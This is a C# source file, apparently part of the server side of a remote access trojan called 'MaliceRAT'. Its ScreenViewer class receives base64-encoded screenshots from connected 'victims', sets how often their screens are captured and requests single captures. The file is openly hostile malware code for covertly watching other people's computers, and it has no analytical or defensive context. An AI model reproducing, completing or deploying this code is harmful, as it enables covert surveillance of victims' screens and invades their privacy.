using System;
using System.Text;
using System.Web.Script.Serialization;

namespace MaliceRAT.RatServer
{
    public class ScreenViewer
    {
        #region Variables
        private JavaScriptSerializer serializer = new JavaScriptSerializer();
        public event Action<byte[]> ScreenshotReceived;
        #endregion

        #region Methods
        private Server server;

        public ScreenViewer(Server server)
        {
            this.server = server;
            server.MessageReceived += HandleMessage;
        }

        private void HandleMessage(Victim victim, dynamic message)
        {
            if (message["type"] == "screenshot")
            {
                byte[] screenshotData = Convert.FromBase64String(message["data"].ToString());
                ScreenshotReceived?.Invoke(screenshotData);
            }
        }

        public void SetScreenUpdateInterval(Victim victim, int interval)
        {
            victim.Send(new { type = "set_interval", interval });
        }

        public void RequestScreenshot(Victim victim)
        {
            SetScreenUpdateInterval(victim, 1000);
            Action<byte[]> handler = null;
            handler = (data) =>
            {
                SetScreenUpdateInterval(victim, 0);
                ScreenshotReceived -= handler;
            };
            ScreenshotReceived += handler;
        }
        #endregion
    }
}